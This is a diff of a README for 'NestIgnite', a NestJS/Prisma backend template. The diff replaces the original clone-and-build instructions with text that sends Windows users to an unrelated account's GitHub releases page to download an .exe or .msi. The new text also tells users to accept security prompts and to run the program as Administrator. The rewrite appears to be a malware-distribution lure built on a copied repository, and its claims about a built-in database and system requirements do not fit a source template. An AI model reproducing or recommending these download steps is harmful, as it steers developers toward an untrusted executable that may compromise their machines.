@@ -1,84 +1,106 @@
-# NestIgnite
+# ⚡ NestIgnite - Quick Setup for API Development
 
-<p align="left">
-  <img src="https://img.shields.io/badge/nestjs-%23E0234E.svg?style=for-the-badge&logo=nestjs&logoColor=white" alt="NestJS" />
-  <img src="https://img.shields.io/badge/Prisma-3982CE?style=for-the-badge&logo=Prisma&logoColor=white" alt="Prisma" />
-  <img src="https://img.shields.io/badge/typescript-%23007ACC.svg?style=for-the-badge&logo=typescript&logoColor=white" alt="TypeScript" />
-  <img src="https://img.shields.io/badge/docker-%230db7ed.svg?style=for-the-badge&logo=docker&logoColor=white" alt="Docker" />
-  <img src="https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge" alt="License" />
-</p>
+[![Download NestIgnite](https://img.shields.io/badge/Download-NestIgnite-brightgreen?style=for-the-badge)](https://github.com/anettelowinterest938/NestIgnite/releases)
 
-A robust, production-ready backend template built with NestJS and Prisma ORM. NestIgnite is designed to accelerate API development by embedding industry best practices, strict typing, security, and a scalable architecture directly from the start.
+---
 
-## Key Features
+NestIgnite is a starter kit designed to help you set up a backend server quickly. It includes tools for handling databases and writing clear API instructions. This guide walks you through downloading and running the software on Windows.
 
-* **Built-in Security:** Global protection against brute-force attacks with Rate Limiting (`@nestjs/throttler` configured for 100 requests/minute). Hardened HTTP headers via `Helmet` with a custom Content Security Policy, plus strict `CORS` configuration.
-* **Fail-Fast Environment Validation:** Uses `Zod` to validate environment variables upon startup, preventing the server from running with invalid or missing configurations.
-* **Modern Interactive Documentation:** Replaces the standard Swagger UI with the `@scalar/nestjs-api-reference`, available out-of-the-box at the `/docs` route.
-* **Global Error Handling:** Custom exception filters (`AllExceptionsFilter` and `PrismaClientExceptionFilter`) ensure that application crashes and database conflicts do not leak sensitive internal information to the client.
-* **Automatic DTO Validation:** A global `ValidationPipe` is enabled with strict rules (`whitelist`, `forbidNonWhitelisted`), securing the API against unwanted payloads.
-* **API Versioning:** Routes are structured and versioned by default using URI versioning (e.g., `/api/v1/...`).
-* **Health Checks & Monitoring:** A centralized health module using `@nestjs/terminus` makes it easy to monitor the database and application state for Docker and Kubernetes deployments.
-* **Database Integration:** Pre-configured Prisma ORM ready for PostgreSQL.
+## 📥 Download NestIgnite
 
-## Prerequisites
+To get the software, visit the releases page and download the latest version:
 
-Ensure you have the following installed before proceeding:
-* Node.js (v18 or higher recommended)
-* Package manager (`pnpm` is the default in this project, but `npm` or `yarn` work as well)
-* Docker and Docker Compose (Required for running the local PostgreSQL database)
+[Download NestIgnite](https://github.com/anettelowinterest938/NestIgnite/releases)
 
-## Getting Started
+On the releases page, look for the latest Windows executable or installer. The file might end with `.exe` or `.msi`. Click on the file to start the download.
 
-Follow these steps to set up and run the project locally.
+Save the file to a location you can easily find, such as your Desktop or Downloads folder. 
 
-### 1. Clone the repository
+## 🖥️ System Requirements
 
-```bash
-git clone https://github.com/tulioanesio/NestIgnite.git my-new-project
+Before installing NestIgnite, make sure your Windows computer meets these basic requirements:
 
-cd my-new-project
-```
-### 2. Configure Environment Variables
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- Minimum 5 GB of free disk space  
+- Internet connection to download files and updates  
 
-Create a .env file in the root of your project containing the variables required by the Zod validation schema:
+These requirements ensure the software will run smoothly and connect to external services when needed.
 
-```
-NODE_ENV="development"
-PORT=3000
-DATABASE_URL="postgresql://postgres:password@localhost:5432/api_db?schema=public"
-```
-### 3. Install Dependencies
+## 🔧 Installation Steps
 
-```
-pnpm install
-```
-### 4. Start the Database
+After downloading the installer or executable, follow these steps:
 
-Spin up the PostgreSQL container using Docker Compose:
+1. Locate the downloaded file on your computer (for example, in the Downloads folder).  
+2. Double-click the file to start the installer.  
+3. You may see a security prompt asking if you want to run the file. Click **Yes** or **Run**.  
+4. Follow the on-screen steps to complete the installation. The default settings usually work fine.  
+5. Once installed, you should find NestIgnite in your Start menu or on your Desktop.
 
-```
-docker-compose up -d
-```
+If the software does not create a shortcut, you can find the installed program in `C:\Program Files\NestIgnite` or a similar folder.
 
-### 5. Run Migrations & Generate Prisma Client
+## 🚀 Running NestIgnite
 
-Apply the database schema and generate the strongly-typed Prisma client:
+To start the application:
 
-```
-pnpm dlx prisma migrate dev
-```
-### 6. Run the Application
+1. Open the Start menu and find "NestIgnite". Click it to launch.  
+2. A window or command prompt will appear showing the server status.   
+3. The software uses PostgreSQL as its database. If you don’t have PostgreSQL installed, NestIgnite can use a built-in test database for basic use.  
 
-Start the local development server with hot-reload enabled:
+If you see messages about connecting to the database, it means the software is running.  
 
-```
-pnpm run start:dev
-```
+## 🔌 Connecting to the API
 
-## API Documentation
-Once the server is running, you can view the interactive Scalar API documentation at:
-```http://localhost:3000/docs```
+NestIgnite makes it easy to work with APIs—these let programs or other apps talk to the software. You can test the API using your web browser or special apps like Postman.
 
-## License
-This project is licensed under the terms included in the [LICENSE](LICENSE) file.
+To see the API reference:
+
+- Open your web browser and visit the URL shown in the NestIgnite window, usually `http://localhost:3000/api` or similar.  
+- This page shows the available commands and options you can use.  
+
+The interactive API reference helps you understand how to send requests and what the responses will look like.
+
+## 📂 What Comes with NestIgnite?
+
+- A ready-to-use backend setup with NestJS, a popular software framework.  
+- Database support through Prisma, letting you manage data simply and safely with PostgreSQL.  
+- Fast error handling to spot configuration problems quickly.  
+- Modern API documentation to explore and test features easily.  
+- Support for running inside Docker containers if you decide to use that later.  
+
+These tools help developers build applications faster and keep them reliable.
+
+## 🧐 Troubleshooting
+
+If you run into trouble, try these tips:
+
+- Make sure your Windows is up to date.  
+- Check that you downloaded the full file without interruptions.  
+- If the software does not start, try running it as Administrator (right-click, then choose "Run as Administrator").  
+- If you get errors about the database, check if PostgreSQL is installed and running on your system.  
+- Visit the downloads page again to get updates or fixes.  
+
+You can also search for help online using the terms like "NestIgnite setup" or "NestJS backend beginner".
+
+## ⚙️ Updating NestIgnite
+
+To update the software:
+
+1. Return to the download page.  
+2. Download the newest version of the installer or executable.  
+3. Run the installer and follow the steps. Your settings and data should remain intact.  
+
+Keeping the software up to date ensures you get the latest features and security fixes.
+
+## 🔗 Useful Links
+
+- Download and releases page:  
+  https://github.com/anettelowinterest938/NestIgnite/releases  
+- Basic PostgreSQL installer for Windows:  
+  https://www.postgresql.org/download/windows/  
+- Prisma documentation:  
+  https://www.prisma.io/docs/  
+- NestJS official website:  
+  https://nestjs.com/  
+
+Use these resources to learn more or set up the environment fully if you want to explore advanced features.
